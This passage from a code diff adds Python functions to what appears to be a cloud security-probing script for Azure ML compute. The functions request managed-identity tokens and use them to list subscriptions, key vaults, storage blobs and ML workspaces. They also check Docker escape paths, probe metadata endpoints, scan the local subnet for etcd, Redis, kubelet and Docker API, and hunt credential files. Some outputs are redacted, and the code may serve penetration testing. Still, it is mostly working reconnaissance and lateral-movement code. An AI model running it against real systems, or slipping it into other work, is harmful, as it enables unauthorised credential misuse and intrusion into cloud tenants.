+                    with open(loc, 'r') as f:
+                        content = f.read()
+                    found_configs[loc] = content
+                else:
+                    found_configs[loc] = "File exists but too large to include"
+            except:
+                found_configs[loc] = "File exists but couldn't read"
+    
+    results["kube_configs"] = found_configs
+    
+    # Check for kubernetes service
+    try:
+        socket_test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        socket_test.settimeout(2)
+        k8s_access = socket_test.connect_ex(("kubernetes.default.svc", 443)) == 0
+        socket_test.close()
+        results["kubernetes_service_accessible"] = k8s_access
+    except:
+        results["kubernetes_service_accessible"] = False
+    
+    # If kubectl is available, try to use it
+    if results["kubectl_installed"]:
+        kubectl_version = run_command("kubectl version --short")
+        results["kubectl_version"] = kubectl_version
+        
+        kubectl_nodes = run_command("kubectl get nodes -o wide")
+        results["kubectl_nodes"] = kubectl_nodes
+        
+        kubectl_pods = run_command("kubectl get pods --all-namespaces")
+        results["kubectl_pods"] = kubectl_pods
+    
+    return results
+
+def test_managed_identity_access():
+    """Test what resources the managed identity can access"""
+    results = {}
+    
+    # Check if MSI endpoint is available
+    msi_endpoint = os.environ.get("MSI_ENDPOINT", "http://169.254.169.254/metadata/identity/oauth2/token")
+    msi_secret = os.environ.get("MSI_SECRET", "")
+    
+    # Try to get a token for ARM
+    try:
+        headers = {"Metadata": "true"}
+        params = {
+            "api-version": "2018-02-01",
+            "resource": "https://management.azure.com/"
+        }
+        
+        if msi_secret:
+            params["secret"] = msi_secret
+        
+        response = requests.get(msi_endpoint, headers=headers, params=params, timeout=10)
+        if response.status_code == 200:
+            token_data = response.json()
+            token = token_data.get("access_token", "")
+            
+            # Don't store the actual token in the results
+            results["arm_token_acquired"] = bool(token)
+            
+            # Now test what subscriptions/resources we can access
+            if token:
+                headers = {"Authorization": f"Bearer {token}"}
+                
+                # List subscriptions
+                sub_response = requests.get(
+                    "https://management.azure.com/subscriptions?api-version=2020-01-01",
+                    headers=headers,
+                    timeout=10
+                )
+                
+                results["subscriptions_accessible"] = {
+                    "status_code": sub_response.status_code,
+                    "subscription_count": len(sub_response.json().get("value", [])) if sub_response.status_code == 200 else 0
+                }
+                
+                # If we have subscription access, test a few key resource types
+                if sub_response.status_code == 200:
+                    subscriptions = [s["subscriptionId"] for s in sub_response.json().get("value", [])]
+                    
+                    if subscriptions:
+                        test_subscription = subscriptions[0]
+                        
+                        # Test storage accounts access
+                        storage_response = requests.get(
+                            f"https://management.azure.com/subscriptions/{test_subscription}/providers/Microsoft.Storage/storageAccounts?api-version=2021-04-01",
+                            headers=headers,
+                            timeout=10
+                        )
+                        
+                        results["storage_accounts_accessible"] = {
+                            "status_code": storage_response.status_code,
+                            "count": len(storage_response.json().get("value", [])) if storage_response.status_code == 200 else 0
+                        }
+                        
+                        # Test key vault access
+                        kv_response = requests.get(
+                            f"https://management.azure.com/subscriptions/{test_subscription}/providers/Microsoft.KeyVault/vaults?api-version=2019-09-01",
+                            headers=headers,
+                            timeout=10
+                        )
+                        
+                        results["key_vaults_accessible"] = {
+                            "status_code": kv_response.status_code,
+                            "count": len(kv_response.json().get("value", [])) if kv_response.status_code == 200 else 0
+                        }
+                        
+                        # Test VM access
+                        vm_response = requests.get(
+                            f"https://management.azure.com/subscriptions/{test_subscription}/providers/Microsoft.Compute/virtualMachines?api-version=2021-03-01",
+                            headers=headers,
+                            timeout=10
+                        )
+                        
+                        results["vms_accessible"] = {
+                            "status_code": vm_response.status_code,
+                            "count": len(vm_response.json().get("value", [])) if vm_response.status_code == 200 else 0
+                        }
+        else:
+            results["arm_token_acquired"] = False
+            results["token_acquisition_error"] = {
+                "status_code": response.status_code,
+                "response": response.text[:200]
+            }
+    except Exception as e:
+        results["arm_token_acquired"] = False
+        results["token_acquisition_error"] = str(e)
+    
+    # Try to get a token for Key Vault
+    try:
+        headers = {"Metadata": "true"}
+        params = {
+            "api-version": "2018-02-01",
+            "resource": "https://vault.azure.net"
+        }
+        
+        if msi_secret:
+            params["secret"] = msi_secret
+        
+        response = requests.get(msi_endpoint, headers=headers, params=params, timeout=10)
+        results["keyvault_token_acquired"] = (response.status_code == 200)
+    except:
+        results["keyvault_token_acquired"] = False
+    
+    # Try to get a token for Storage
+    try:
+        headers = {"Metadata": "true"}
+        params = {
+            "api-version": "2018-02-01",
+            "resource": "https://storage.azure.com/"
+        }
+        
+        if msi_secret:
+            params["secret"] = msi_secret
+        
+        response = requests.get(msi_endpoint, headers=headers, params=params, timeout=10)
+        results["storage_token_acquired"] = (response.status_code == 200)
+    except:
+        results["storage_token_acquired"] = False
+    
+    return results
+
+def test_docker_escape():
+    """Test if we can escape from a docker container"""
+    results = {}
+    
+    # Check if we're in a container (note: not 100% reliable)
+    in_container = False
+    
+    # Check for container indicators
+    docker_env = Path("/.dockerenv")
+    cgroup_file = Path("/proc/1/cgroup")
+    
+    if docker_env.exists():
+        in_container = True
+        results["container_indicator"] = "/.dockerenv exists"
+    elif cgroup_file.exists():
+        try:
+            with open(cgroup_file, 'r') as f:
+                cgroup_content = f.read()
+                if 'docker' in cgroup_content or 'lxc' in cgroup_content:
+                    in_container = True
+                    results["container_indicator"] = "docker/lxc found in cgroup"
+        except:
+            pass
+    
+    results["in_container"] = in_container
+    
+    if in_container:
+        # Check for privileged mode
+        security_dirs = [
+            "/sys/admin",
+            "/sys/kernel",
+            "/dev/mem",
+            "/dev/kmem",
+            "/dev/port",
+            "/proc/kcore",
+            "/proc/sys/kernel"
+        ]
+        
+        privileged_indicators = {}
+        for sd in security_dirs:
+            path = Path(sd)
+            try:
+                privileged_indicators[sd] = {
+                    "exists": path.exists(),
+                    "writable": os.access(sd, os.W_OK) if path.exists() else False
+                }
+            except:
+                privileged_indicators[sd] = {"exists": "error checking"}
+        
+        results["privileged_indicators"] = privileged_indicators
+        
+        # Check for mounted docker socket
+        docker_socket = Path("/var/run/docker.sock")
+        results["docker_socket_mounted"] = docker_socket.exists()
+        
+        if docker_socket.exists():
+            socket_writable = os.access("/var/run/docker.sock", os.W_OK)
+            results["docker_socket_writable"] = socket_writable
+            
+            # Try docker command
+            docker_ps = run_command("docker ps")
+            results["docker_access"] = docker_ps["returncode"] == 0
+        
+        # Check for host mounts
+        mounts_cmd = run_command("mount")
+        results["mounts"] = mounts_cmd
+        
+        # Look for suspicious bind mounts from host
+        suspicious_mounts = []
+        if mounts_cmd["returncode"] == 0:
+            suspicious_patterns = [
+                "/var/run/docker.sock",
+                "/var/lib/docker",
+                "/home/",
+                "/root",
+                "/.ssh",
+                "/etc/kubernetes",
+                "/etc/passwd",
+                "/etc/shadow",
+                "/var/run/secrets"
+            ]
+            
+            for line in mounts_cmd["stdout"].splitlines():
+                for pattern in suspicious_patterns:
+                    if pattern in line:
+                        suspicious_mounts.append(line)
+        
+        results["suspicious_mounts"] = suspicious_mounts
+        
+        # Check for capabilities
+        cap_cmd = run_command("capsh --print || getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null")
+        results["capabilities"] = cap_cmd
+    
+    return results
+
+def test_metadata_services():
+    """Test access to cloud provider metadata services for SSRF opportunities"""
+    results = {}
+    
+    # Test Azure IMDS
+    try:
+        response = requests.get(
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            headers={"Metadata": "true"},
+            timeout=3
+        )
+        
+        if response.status_code == 200:
+            results["azure_imds"] = {
+                "accessible": True,
+                "data_sample": str(response.json())[:500] + "..."  # Truncate long responses
+            }
+        else:
+            results["azure_imds"] = {
+                "accessible": False,
+                "status_code": response.status_code
+            }
+    except Exception as e:
+        results["azure_imds"] = {
+            "accessible": False,
+            "error": str(e)
+        }
+    
+    # Check for other metadata service addresses
+    metadata_ips = [
+        "169.254.169.254",  # AWS, Azure, GCP, DigitalOcean
+        "169.254.170.2",    # AWS ECS task metadata
+        "fd00:ec2::254",    # AWS IPv6
+        "100.100.100.200",  # Alibaba Cloud
+    ]
+    
+    for ip in metadata_ips:
+        if ip == "169.254.169.254" and "azure_imds" in results:
+            continue  # Already tested
+            
+        try:
+            # Try different paths used by different cloud providers
+            paths = ["", "/latest/meta-data/", "/computeMetadata/v1/"]
+            headers = [{}, {"Metadata": "true"}, {"Metadata-Flavor": "Google"}]
+            
+            for path in paths:
+                for header in headers:
+                    try:
+                        # Use a short timeout as these will fail if not accessible
+                        url = f"http://{ip}{path}"
+                        response = requests.get(url, headers=header, timeout=2)
+                        
+                        if response.status_code < 400:  # Any success or redirect
+                            results[f"metadata_{ip}{path}"] = {
+                                "accessible": True,
+                                "status_code": response.status_code,
+                                "headers": dict(response.headers),
+                                "data_sample": response.text[:200] if response.text else ""
+                            }
+                            # Break early if we find something
+                            break
+                    except:
+                        pass
+        except:
+            pass
+    
+    return results
+
+def scan_for_unprotected_services():
+    """Scan for internal services that might allow lateral movement"""
+    results = {}
+    
+    # Services to check
+    services = {
+        "etcd": {
+            "ports": [2379, 2380],
+            "paths": ["/v2/keys", "/v2/members"],
+            "test_commands": ["etcdctl ls /"]
+        },
+        "redis": {
+            "ports": [6379],
+            "test_commands": ["redis-cli -h localhost info", "redis-cli -h localhost CONFIG GET *"]
+        },
+        "mongodb": {
+            "ports": [27017, 27018],
+            "test_commands": ["mongo --eval 'db.adminCommand({listDatabases:1})'"]
+        },
+        "elasticsearch": {
+            "ports": [9200, 9300],
+            "paths": ["/", "/_cat/indices", "/_cluster/health"],
+            "test_commands": ["curl -s localhost:9200/_cat/indices"]
+        },
+        "kubelet": {
+            "ports": [10250, 10255, 4194],
+            "paths": ["/pods", "/spec", "/stats/summary", "/healthz"],
+            "test_commands": []
+        },
+        "dashboard": {
+            "ports": [8443, 8080, 443],
+            "paths": ["/api/v1", "/api/v1/namespaces/kube-system/services", "/api/v1/namespaces"],
+            "test_commands": []
+        },
+        "docker_api": {
+            "ports": [2375, 2376],
+            "paths": ["/containers/json", "/info", "/version"],
+            "test_commands": ["curl -s localhost:2375/info"]
+        },
+        "prometheus": {
+            "ports": [9090],
+            "paths": ["/metrics", "/api/v1/targets", "/graph"],
+            "test_commands": []
+        }
+    }
+    
+    # Check from localhost first
+    host = "localhost"
+    results["localhost"] = {}
+    
+    for service_name, service_info in services.items():
+        service_results = {"accessible": False, "ports": {}, "commands": {}, "paths": {}}
+        
+        # Check ports
+        for port in service_info.get("ports", []):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                result = sock.connect_ex((host, port))
+                
+                service_results["ports"][port] = {
+                    "open": (result == 0)
+                }
+                
+                if result == 0:
+                    service_results["accessible"] = True
+                
+                sock.close()
+            except Exception as e:
+                service_results["ports"][port] = {
+                    "error": str(e)
+                }
+        
+        # Try HTTP endpoints if applicable
+        for port in [p for p in service_info.get("ports", []) if service_results["ports"].get(p, {}).get("open", False)]:
+            for path in service_info.get("paths", []):
+                try:
+                    url = f"http://{host}:{port}{path}"
+                    response = requests.get(url, timeout=2)
+                    
+                    service_results["paths"][f"{port}{path}"] = {
+                        "status_code": response.status_code,
+                        "accessible": response.status_code < 400,
+                        "data_sample": response.text[:200] if response.text else ""
+                    }
+                    
+                    if response.status_code < 400:
+                        service_results["accessible"] = True
+                except Exception as e:
+                    service_results["paths"][f"{port}{path}"] = {
+                        "error": str(e)
+                    }
+        
+        # Try service-specific commands
+        for command in service_info.get("test_commands", []):
+            cmd_result = run_command(command)
+            service_results["commands"][command] = {
+                "returncode": cmd_result["returncode"],
+                "stdout_sample": cmd_result["stdout"][:200] if cmd_result["stdout"] else "",
+                "stderr_sample": cmd_result["stderr"][:200] if cmd_result["stderr"] else ""
+            }
+            
+            if cmd_result["returncode"] == 0:
+                service_results["accessible"] = True
+        
+        results["localhost"][service_name] = service_results
+    
+    # Now scan the local subnet for a few critical services
+    network_info = discover_network()
+    local_subnets = network_info.get("local_subnets", [])
+    
+    if local_subnets:
+        # Just use the first subnet for now
+        subnet_to_scan = local_subnets[0]
+        
+        # Critical ports to scan on the network
+        critical_ports = [
+            22,     # SSH
+            80,     # HTTP
+            443,    # HTTPS
+            2379,   # etcd
+            6379,   # Redis
+            6443,   # Kubernetes API
+            8080,   # Various HTTP services
+            10250,  # Kubelet
+            27017   # MongoDB
+        ]
+        
+        results["subnet_scan"] = scan_subnet(subnet_to_scan, critical_ports)
+    
+    return results
+
+def test_for_credential_leaks():
+    """Look for leaked credentials in environment, files, and logs"""
+    results = {}
+    
+    # Check environment variables for credentials
+    env_vars = dict(os.environ)
+    sensitive_env_vars = {}
+    
+    # List of patterns that might indicate credentials
+    sensitive_patterns = [
+        "key", "secret", "password", "credential", "token", "accesskey", 
+        "auth", "login", "pwd", "api", "cert", "jwt", "bearer"
+    ]
+    
+    # Check environment variables
+    for key, value in env_vars.items():
+        for pattern in sensitive_patterns:
+            if pattern.lower() in key.lower():
+                sensitive_env_vars[key] = "[REDACTED]"  # Don't store actual credentials
+                break
+    
+    results["sensitive_env_vars"] = {
+        "count": len(sensitive_env_vars),
+        "variables": list(sensitive_env_vars.keys())
+    }
+    
+    # Common paths where credentials might be stored
+    credential_paths = [
+        os.path.expanduser("~/.aws"),
+        os.path.expanduser("~/.azure"),
+        os.path.expanduser("~/.kube"),
+        os.path.expanduser("~/.ssh"),
+        os.path.expanduser("~/.docker"),
+        os.path.expanduser("~/.config"),
+        os.path.expanduser("~/.bashrc"),
+        os.path.expanduser("~/.bash_history"),
+        os.path.expanduser("~/.profile"),
+        "/etc/kubernetes",
+        "/var/run/secrets",
+        "/tmp",
+        "/mnt/azureml/cr"
+    ]
+    
+    # Check each path for existence
+    found_credential_files = []
+    for path_str in credential_paths:
+        path = Path(path_str)
+        if path.exists():
+            if path.is_dir():
+                # Just check files in the directory, don't go recursive
+                try:
+                    files = list(path.glob("*"))
+                    for file in files:
+                        if file.is_file():
+                            # Check if file contains credential-like names
+                            for pattern in sensitive_patterns:
+                                if pattern.lower() in file.name.lower():
+                                    found_credential_files.append(str(file))
+                                    break
+                except:
+                    pass
+            elif path.is_file():
+                found_credential_files.append(str(path))
+    
+    results["credential_files"] = {
+        "count": len(found_credential_files),
+        "files": found_credential_files
+    }
+    
+    # Look for certificates and keys
+    cert_files = []
+    for ext in [".pem", ".crt", ".cer", ".key", ".p12", ".pfx", ".jks"]:
+        # Check common locations
+        for base_path in ["/tmp", "/etc", "/var/run", os.path.expanduser("~")]:
+            try:
+                base_dir = Path(base_path)
+                if base_dir.exists() and base_dir.is_dir():
+                    # Don't go recursive, just check the base directories
+                    for file in base_dir.glob(f"*{ext}"):
+                        if file.is_file():
+                            cert_files.append(str(file))
+            except:
+                pass
+    
+    results["certificate_files"] = {
+        "count": len(cert_files),
+        "files": cert_files
+    }
+    
+    return results
+
+def test_aml_specific_vectors():
+    """Test for Azure ML specific lateral movement vectors"""
+    results = {}
+    
+    # Check for access to other AML workspaces
+    # Look for AML specific environment variables
+    aml_env_vars = {}
+    for key, value in os.environ.items():
+        if any(x in key.upper() for x in ["AZUREML", "AML", "WORKSPACE"]):
+            aml_env_vars[key] = value
+    
+    results["aml_env_vars"] = {k: v for k, v in aml_env_vars.items() if not any(
+        s in k.lower() for s in ["key", "secret", "token", "password", "credential"])}
+    
+    # Check for AML workspace access
+    try:
+        # Try to get ARM token
+        msi_endpoint = os.environ.get("MSI_ENDPOINT", "http://169.254.169.254/metadata/identity/oauth2/token")
+        msi_secret = os.environ.get("MSI_SECRET", "")
+        
+        headers = {"Metadata": "true"}
+        params = {
+            "api-version": "2018-02-01",
+            "resource": "https://management.azure.com/"
+        }
+        
+        if msi_secret:
+            params["secret"] = msi_secret
+        
+        response = requests.get(msi_endpoint, headers=headers, params=params, timeout=10)
+        if response.status_code == 200:
+            token_data = response.json()
+            token = token_data.get("access_token", "")
+            
+            if token:
+                # First get subscription list
+                headers = {"Authorization": f"Bearer {token}"}
+                sub_response = requests.get(
+                    "https://management.azure.com/subscriptions?api-version=2020-01-01",
+                    headers=headers,
+                    timeout=10
+                )
+                
+                if sub_response.status_code == 200:
+                    subscriptions = sub_response.json().get("value", [])
+                    results["subscription_count"] = len(subscriptions)
+                    
+                    # Check each subscription for ML workspaces
+                    workspace_results = {}
+                    
+                    for sub in subscriptions[:3]:  # Limit to first 3 subscriptions
+                        sub_id = sub["subscriptionId"]
+                        
+                        ml_response = requests.get(
+                            f"https://management.azure.com/subscriptions/{sub_id}/providers/Microsoft.MachineLearningServices/workspaces?api-version=2021-07-01",
+                            headers=headers,
+                            timeout=15
+                        )
+                        
+                        if ml_response.status_code == 200:
+                            workspaces = ml_response.json().get("value", [])
+                            workspace_results[sub_id] = {
+                                "count": len(workspaces),
+                                "workspaces": []
+                            }
+                            
+                            # Check access to each workspace
+                            for ws in workspaces[:3]:  # Limit to first 3 workspaces
+                                ws_id = ws["id"]
+                                ws_name = ws["name"]
+                                ws_location = ws["location"]
+                                
+                                # Try to get compute resources in the workspace
+                                compute_response = requests.get(
+                                    f"https://management.azure.com{ws_id}/computes?api-version=2021-07-01",
+                                    headers=headers,
+                                    timeout=15
+                                )
+                                
+                                ws_data = {
+                                    "name": ws_name,
+                                    "location": ws_location,
+                                    "compute_access": {
+                                        "status_code": compute_response.status_code,
+                                        "accessible": compute_response.status_code == 200,
+                                        "compute_count": len(compute_response.json().get("value", [])) if compute_response.status_code == 200 else 0
+                                    }
+                                }
+                                
+                                workspace_results[sub_id]["workspaces"].append(ws_data)
+                    
+                    results["ml_workspaces"] = workspace_results
+    except Exception as e:
+        results["aml_access_error"] = str(e)
+    
+    # Check for AML run history DB access
+    # This could potentially allow access to other experiment logs
+    run_history_endpoint = os.environ.get("AZUREML_RUN_HISTORY_SERVICE_ENDPOINT")
+    if run_history_endpoint:
+        results["run_history_endpoint"] = run_history_endpoint
+        
+        # Try to get token for run history
+        try:
+            headers = {"Metadata": "true"}
+            params = {
+                "api-version": "2018-02-01",
+                "resource": "https://api.azureml.ms"  # Run history API resource
+            }
+            
+            if msi_secret:
+                params["secret"] = msi_secret
+            
+            response = requests.get(msi_endpoint, headers=headers, params=params, timeout=10)
+            results["run_history_token_acquired"] = (response.status_code == 200)
+            
+            if response.status_code == 200:
+                # We could try to access run history API here, but it's complex and endpoint structure varies
+                pass
+        except Exception as e:
+            results["run_history_token_error"] = str(e)
+    
+    # Check for mounted AML datasets
+    dataset_mounts = []
+    mount_result = run_command("mount | grep azureml")
+    if mount_result["returncode"] == 0:
+        for line in mount_result["stdout"].splitlines():
+            dataset_mounts.append(line)
+    
+    results["dataset_mounts"] = dataset_mounts
+    
+    return results
+
+def test_for_storage_access():
+    """Test if we can access Azure Storage accounts directly"""
+    results = {}
+    
+    # First get a token for storage access
+    msi_endpoint = os.environ.get("MSI_ENDPOINT", "http://169.254.169.254/metadata/identity/oauth2/token")
+    msi_secret = os.environ.get("MSI_SECRET", "")
+    storage_token = None
+    
+    try:
+        headers = {"Metadata": "true"}
+        params = {
+            "api-version": "2018-02-01",
+            "resource": "https://storage.azure.com/"
+        }
+        
+        if msi_secret:
+            params["secret"] = msi_secret
+        
+        response = requests.get(msi_endpoint, headers=headers, params=params, timeout=10)
+        if response.status_code == 200:
+            token_data = response.json()
+            storage_token = token_data.get("access_token", "")
+            results["storage_token_acquired"] = bool(storage_token)
+        else:
+            results["storage_token_acquired"] = False
+    except Exception as e:
+        results["storage_token_acquired"] = False
+        results["token_error"] = str(e)
+    
+    # Try to find storage account names from environment or mounted resources
+    storage_accounts = []
+    
+    # Check environment variables for storage hints
+    for key, value in os.environ.items():
+        if "storage" in key.lower() and ".blob.core.windows.net" in value.lower():
+            account_match = re.search(r"https?://([^\.]+)\.blob\.core\.windows\.net", value)
+            if account_match:
+                storage_accounts.append(account_match.group(1))
+    
+    # Check for storage account mount points
+    mount_result = run_command("mount | grep fuse")
+    if mount_result["returncode"] == 0:
+        for line in mount_result["stdout"].splitlines():
+            if "blob.core.windows.net" in line:
+                account_match = re.search(r"([^\.]+)\.blob\.core\.windows\.net", line)
+                if account_match:
+                    storage_accounts.append(account_match.group(1))
+    
+    # Remove duplicates
+    storage_accounts = list(set(storage_accounts))
+    results["storage_accounts_found"] = storage_accounts
+    
+    # Try to access each storage account
+    if storage_token and storage_accounts:
+        access_results = {}
+        
+        for account in storage_accounts:
+            account_result = {"containers": None, "blobs": {}}
+            
+            # Try to list containers
+            try:
+                headers = {"Authorization": f"Bearer {storage_token}"}
+                response = requests.get(
+                    f"https://{account}.blob.core.windows.net/?comp=list",
+                    headers=headers,
+                    timeout=10
+                )
+                
+                account_result["containers"] = {
+                    "status_code": response.status_code,
+                    "accessible": response.status_code == 200
+                }
+                
+                # If we can list containers, parse the XML to get container names
+                if response.status_code == 200:
+                    try:
+                        import xml.etree.ElementTree as ET
+                        root = ET.fromstring(response.text)
+                        containers = []
+                        
+                        # Find container names in the XML
+                        for container in root.findall("./Containers/Container/Name"):
+                            containers.append(container.text)
+                            
+                        account_result["container_names"] = containers
+                        
+                        # Try to access a few containers if found
+                        for container_name in containers[:3]:  # Limit to first 3
+                            try:
+                                blob_response = requests.get(
+                                    f"https://{account}.blob.core.windows.net/{container_name}?restype=container&comp=list",
+                                    headers=headers,
+                                    timeout=10
+                                )
+                                
+                                account_result["blobs"][container_name] = {
+                                    "status_code": blob_response.status_code,
+                                    "accessible": blob_response.status_code == 200,
+                                    "sample": blob_response.text[:200] if blob_response.status_code == 200 else ""
+                                }
+                            except Exception as e:
+                                account_result["blobs"][container_name] = {
+                                    "error": str(e)
+                                }
+                    except Exception as e:
+                        account_result["xml_parse_error"] = str(e)
+            except Exception as e:
+                account_result["error"] = str(e)
+            
+            access_results[account] = account_result
+        
+        results["storage_access_results"] = access_results
+    
+    return results
